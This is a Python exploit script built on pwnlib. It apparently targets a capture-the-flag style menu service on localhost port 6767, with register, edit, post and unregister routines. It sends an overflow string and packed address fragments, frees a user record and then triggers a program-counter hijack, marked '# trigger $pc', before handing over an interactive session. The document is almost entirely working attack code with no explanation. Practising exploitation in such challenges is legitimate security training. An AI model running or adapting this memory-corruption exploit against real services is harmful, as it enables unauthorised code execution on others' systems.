from pwnlib import *

def unregister():
	s.send("1\n")

	s.ru("? (Y/N)\n->")
	s.send("Y\n")

	s.ru(". Exit\n-> ")


def edit():
	s.ru(". Exit\n-> ")
	s.send("1\n")

	s.ru("? (Y/N)\n->")
	s.send("N\n")

	s.ru("? (Y/N)\n->")
	s.send("Y\n")

	s.ru(" Back \n-> ")
	s.send("\n")

	s.ru("etry !\n-> ")
	s.send("222222AAAAAAAAAAAAAAAAAA\n")

	s.ru("etry !\n-> ")
	s.send("1\n")

	s.ru(" name?\n-> ")
	s.send("\n")

	#s.ru("etry !\n-> ")
	s.send("2\n")

	s.ru("umber?\n-> ")

	s.send(pq(0x41297f)[:3] + "\n")



	s.send("3\n")

	s.ru("code ?\n-> ")
	s.send("CCCCCCCCCCCCCCCCCCCC\n")

	s.ru("etry !\n-> ")
	s.send("4\n")

	s.ru("dress?\n-> ")
	s.send("DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD\n")

	s.ru("etry !\n-> ")
	s.send("5\n")

	s.ru(". Exit\n-> ")


def register():
	s.ru(". Exit\n-> ")
	s.send("1\n")

	s.ru(" name?\n-> ")
	s.send(pd(0x400101)[:3] + "\n")

	s.ru("numer?\n-> ")
	s.send("1\n")

	s.ru(" code?\n-> ")
	s.send("2\n")

	s.ru("dress?\n-> ")
	s.send("A\n")

def create_post(name):
	s.ru(". Exit\n-> ")
	s.send("2\n")

	s.ru(" Books\n-> ")
	s.send("1\n")

	s.ru(" post?\n-> ")
	s.send("123\n")

	s.ru(" Gift \n-> ")
	s.send("aaaa\n")

	s.ru(" name?\n-> ")
	s.send("%s\n" % name)

	s.ru("numer?\n-> ")
	s.send("cccc\n")

	s.ru(" code?\n-> ")
	s.send("dddd\n")

	s.ru("dress?\n-> ")
	s.send("eeee\n")

	s.ru(" (Y/N)\n-> ")
	s.send("Y\n")



s = Socket(("localhost", 6767))

# s.ru("ne.\n(gdb) ")
# s.send("set follow-fork-mode parent\n")
# 
# s.ru("(gdb) ")
# s.send("b *0x412998\n")
# 
# s.ru("(gdb) ")
# s.send("set disable-rand off\n")
# 
# # s.ru("(gdb) ")
# # s.send("set environ MALLOC_PERTURB_ 123\n")
# 
# s.ru("(gdb) ")
# s.send("r\n")


register()

create_post("AAAA")
create_post("BBBB")
create_post("CCCC")
create_post("DDDD")
create_post("EEEE")
create_post("FFFF")
create_post("GGGG")


edit()

unregister()



# send some post

s.send("4\n")

s.ru(" post \n-> ")

s.send("1\n")

s.ru(". Exit\n-> ")
s.send("4\n")

s.ru(" post \n-> ")
s.send("2\n")

s.ru(". Exit\n-> ")



# trigger $pc

s.send("3\n")

s.ru(" post \n-> ")
s.send("2\n")

s.ru(" Back \n-> ")
s.send("2\n")



s.interact()
